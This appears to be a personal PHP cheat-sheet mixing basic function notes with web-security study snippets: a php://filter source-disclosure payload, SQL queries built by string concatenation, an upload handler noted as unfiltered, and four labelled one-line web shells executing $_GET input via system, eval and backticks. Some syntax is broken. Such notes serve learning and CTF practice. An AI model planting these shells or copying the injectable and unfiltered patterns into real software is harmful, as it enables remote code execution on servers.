<?
# Mainly devided into two aspects, one is the normal functions,another is self functions
?>
<?php
# @length
strlen($str) # string len
count() or sizeof() # array len

# @substr

echo substr("123456",0,2),substr("123456",0,-1);# parameters (strings,start,length) is length is minus it mines that start t end 

# @glob
glob('*.php');#param (pattern) function which is to list all files pattern matched

# @strpos
strpos('asd','sd')#param(str,needle) the 'sd' first came out 

# @preg
preg_match('/^fg/', 'asdasdfg' , $matches, PREG_OFFSET_CAPTURE);

# @php://

# @array_map

# @array
$arry = [] 
$arrayName = array('' => , );#init
$arry[] = 1 #add
array_keys()#return all the keys or a subset of the keys of an array

# @path
$path_parts = pathinfo('/www/htdocs/inc/lib.inc.php');
echo $path_parts['dirname'], "\n";#/www/htdocs/inc
echo $path_parts['basename'], "\n";#lib.inc.php
echo $path_parts['extension'], "\n";#php
echo $path_parts['filename'], "\n"; #lib.inc
# @server
#test url:     http://localhost/blog/testurl.php?id=5
echo $_SERVER['HTTP_HOST']."<br>"; #localhost
echo $_SERVER['PHP_SELF']."<br>"; #/blog/testurl.php 
echo $_SERVER["QUERY_STRING"]."<br>"; #id=5
echo $_SERVER['REQUEST_URI']# /blog/testurl.php?id=5
echo $_SERVER["SERVER_PORT"]#80 port 
# @json
json_encode($arr) # change array to json strings
# @filter
file=php://filter/read=convert.base64-encode/resource=index.php 
# @file
file_put_contents("test.txt", "This is another something.", FILE_APPEND);# file append
# @header
header('Location: http://www.baidu.com/');
?>


<?php 
	# [mysql]
	
?>

<?php 
	# [mysqli]
	error_reporting(1);
	$conn=mysqli_connect('127.0.0.1','root','111111','bas_db');
	if (!$conn) {   
	die('Could not connect to MySQL: ' . mysqli_error());   
	} 
	$conn->query("SET NAMES 'utf8'");
	// mysql_query("set character set 'utf8'");//读库 
	// mysql_query("set names 'utf8'");//写库 
	$result = mysqli_query($conn,$sql);
	$result = $conn->query("SELECT * FROM `user` WHERE username = '$username'");
	$row = $result->fetch_assoc();
	$row = @mysqli_fetch_assoc($result);
	//---------------------------------
	$link = mysql_connect('localhost', 'user', 'pass');
	$db_selected = mysql_select_db('foo', $link);
	$result = mysql_query("select password from users where username='" . $username . "'", $con);
	$row = mysql_fetch_array($result);	
?>


<!--  upload file -->
<!DOCTYPE html>
<html>
<head>
    <title>文件信息</title>
</head>
<meta charset="utf-8">
<body>
<form action="" enctype="multipart/form-data" method="POST" name="uploadfile">
    上传文件: <input type="file" name="upfile" />
    <input type="submit" value="http://dearch.blog.51cto.com/10423918/上传" name="submit">
</form>
</body>
</html>
<!-- 完全没有过滤，任意文件上传 -->
<?php
if (isset($_POST['submit'])) {
    var_dump($_FILES['upfile']);
    echo "文件名：".$_FILES['upfile']['name']."<br />";
    echo "文件大小：".$_FILES['upfile']['size']."<br />";
    echo "文件类型：".$_FILES['upfile']['type']."<br />";
    echo "临时路径：".$_FILES['upfile']['tmp_name']."<br />";
    echo "上传后系统返回值：".$_FILES['upfile']['error']."<br />";
    echo "====================保存分各线========================<br />";
    if ($_FILES['upfile']['error'] == 0) {
        if (!is_dir("./upload")) {
            mkdir("./upload");
        }
        $dir = "./upload/".$_FILES['upfile']['name'];
        move_uploaded_file($_FILES['upfile']['tmp_name'],$dir);
        echo "文件保存路径：".$dir."<br />";
        echo "上传成功...<br />";
        echo "图片预览：<br />";

    }
}
 ?>


<!-- webshell -->

<?php 
echo `$_GET[a]`;
?>

<script language=php>
echo `$_GET[a]`;
</script>


<?php 
echo system($_GET['a']);
?>

<?php 
echo eval($_GET['a']);
?>


